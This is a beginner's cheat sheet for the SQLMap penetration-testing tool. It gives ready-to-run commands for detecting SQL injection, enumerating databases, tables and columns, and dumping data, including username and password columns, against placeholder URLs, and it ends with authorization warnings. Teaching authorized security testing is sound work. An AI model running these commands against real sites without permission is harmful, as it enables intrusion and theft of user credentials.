# SQLMap Cheat Sheet

## What is SQLMap?

**SQLMap** is an open-source penetration testing tool that automates the process of detecting and exploiting **SQL Injection (SQLi)** vulnerabilities in web applications.

Instead of manually testing SQL Injection payloads, SQLMap automatically:

- Detects SQL Injection vulnerabilities.
- Identifies the backend Database Management System (DBMS).
- Enumerates databases, tables, and columns.
- Extracts data from databases.
- Tests different SQL Injection techniques.
- Performs many SQL Injection tasks automatically.

> **Official Website:** https://sqlmap.org/

---

# How SQLMap Works

A typical SQLMap workflow looks like this:

```
Target URL
      │
      ▼
Detect SQL Injection
      │
      ▼
Identify DBMS
      │
      ▼
Enumerate Databases
      │
      ▼
Enumerate Tables
      │
      ▼
Enumerate Columns
      │
      ▼
Dump Data
```

---

# Basic Command Syntax

```bash
sqlmap -u "<URL>" [OPTIONS]
```

Example:

```bash
sqlmap -u "http://example.com/product.php?id=1"
```

---

# Important Requirement

The URL **must contain a parameter**.

✅ Correct

```text
http://example.com/product.php?id=1
```

```text
http://example.com/search.php?category=Laptop
```

❌ Incorrect

```text
http://example.com/
```

SQLMap needs a parameter to test for SQL Injection.

---

# Understanding Common Options

| Option | Description |
|---------|-------------|
| `-u` | Target URL |
| `--batch` | Automatically answer "Yes" to prompts |
| `--dbs` | List databases |
| `-D` | Select a database |
| `--tables` | List tables |
| `-T` | Select a table |
| `--columns` | List columns |
| `-C` | Select specific columns |
| `--dump` | Extract table data |
| `--banner` | Display database version |
| `--current-user` | Display current database user |
| `--current-db` | Display current database |
| `--dbms` | Specify the DBMS manually |
| `--risk` | Increase testing risk level |
| `--level` | Increase number of tests |

---

# 1. Detect SQL Injection

```bash
sqlmap -u "<URL>" --batch
```

Example

```bash
sqlmap -u "http://example.com/product.php?id=1" --batch
```

### Purpose

- Detect SQL Injection
- Identify vulnerable parameter
- Detect SQL Injection technique
- Identify backend DBMS

---

# 2. Identify Database Banner

```bash
sqlmap -u "<URL>" --banner --batch
```

Example

```bash
sqlmap -u "http://example.com/product.php?id=1" --banner --batch
```

### Purpose

Displays the database version.

Example Output

```
Microsoft SQL Server 2019
```

or

```
PostgreSQL 15
```

---

# 3. Show Current Database

```bash
sqlmap -u "<URL>" --current-db --batch
```

### Purpose

Displays the currently selected database.

---

# 4. Show Current Database User

```bash
sqlmap -u "<URL>" --current-user --batch
```

### Purpose

Displays the current database username.

---

# 5. List Databases

```bash
sqlmap -u "<URL>" --dbs --batch
```

### Purpose

Enumerates all databases available on the server.

Example Output

```
information_schema
users
shop
```

---

# 6. List Tables

```bash
sqlmap -u "<URL>" -D shop --tables --batch
```

### Purpose

Lists all tables inside the selected database.

Example Output

```
products
users
orders
payments
```

---

# 7. List Columns

```bash
sqlmap -u "<URL>" -D shop -T users --columns --batch
```

### Purpose

Lists every column inside a table.

Example Output

```
id
username
password
email
role
```

---

# 8. Dump Table Data

```bash
sqlmap -u "<URL>" -D shop -T users --dump --batch
```

### Purpose

Extracts all records from the selected table.

---

# 9. Dump Specific Columns

```bash
sqlmap -u "<URL>" -D shop -T users -C username,password --dump --batch
```

### Purpose

Extracts only the selected columns.

---

# 10. Specify the Database Type

If you already know the backend database, tell SQLMap.

```bash
sqlmap -u "<URL>" --dbms=MySQL
```

Supported databases include:

- MySQL
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite

This speeds up testing.

---

# 11. Increase Testing Level

```bash
sqlmap -u "<URL>" --level=5 --risk=3
```

### Purpose

- Tests more payloads.
- Performs deeper testing.
- May take longer to complete.

Default values:

| Option | Default |
|---------|---------|
| Level | 1 |
| Risk | 1 |

Maximum values:

| Option | Maximum |
|---------|---------|
| Level | 5 |
| Risk | 3 |

---

# Typical SQLMap Workflow

```
Identify Target URL
        │
        ▼
Detect SQL Injection

sqlmap -u "<URL>" --batch

        │
        ▼
Identify Database Version

sqlmap --banner

        │
        ▼
Find Current Database

sqlmap --current-db

        │
        ▼
List Databases

sqlmap --dbs

        │
        ▼
Select Database

sqlmap -D shop --tables

        │
        ▼
Select Table

sqlmap -D shop -T users --columns

        │
        ▼
Dump Required Data

sqlmap -D shop -T users --dump
```

---

# Tips for Beginners

- Start with manual SQL Injection testing before using SQLMap.
- Verify that the URL contains a parameter.
- Always understand what each command does before running it.
- Avoid using `--dump` unless it is required and authorized.
- Read SQLMap output carefully to understand the vulnerability.

---

# Important Security & Legal Notes

⚠️ **Use SQLMap only when you have authorization.**

SQLMap should only be used:

- On systems you own.
- During PortSwigger Web Security Academy labs.
- During Capture The Flag (CTF) events.
- During authorized penetration testing.
- During bug bounty programs that explicitly allow testing.

Never use SQLMap against systems without explicit permission.

Unauthorized testing may violate laws and organizational policies.
